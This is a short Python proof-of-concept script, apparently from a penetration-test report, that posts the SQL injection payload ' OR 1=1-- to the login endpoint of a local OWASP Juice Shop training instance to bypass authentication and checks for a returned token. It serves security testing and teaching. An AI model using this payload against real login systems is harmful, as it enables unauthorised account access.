"""
PoC: SQL Injection Login Bypass - OWASP Juice Shop
Target: Local, self-hosted Juice Shop instance ONLY.
Do NOT run against any system you do not own or have explicit permission to test.

Demonstrates that the login endpoint accepts a classic SQLi payload
in the email field to bypass authentication (see Finding 1 in VAPT_Report.md).
"""

import requests

TARGET_URL = "http://127.0.0.1:3000/rest/user/login"  # local lab instance only

payload = {
    "email": "' OR 1=1--",
    "password": "anything"
}

def test_sqli_login_bypass():
    response = requests.post(TARGET_URL, json=payload, timeout=10)
    print(f"Status Code: {response.status_code}")
    print("Response Body:")
    print(response.text)

    if response.status_code == 200 and "authentication" in response.text.lower():
        print("\n[+] Login bypass likely successful — server returned an auth token.")
    else:
        print("\n[-] Bypass did not succeed with this payload/response.")

if __name__ == "__main__":
    test_sqli_login_bypass()
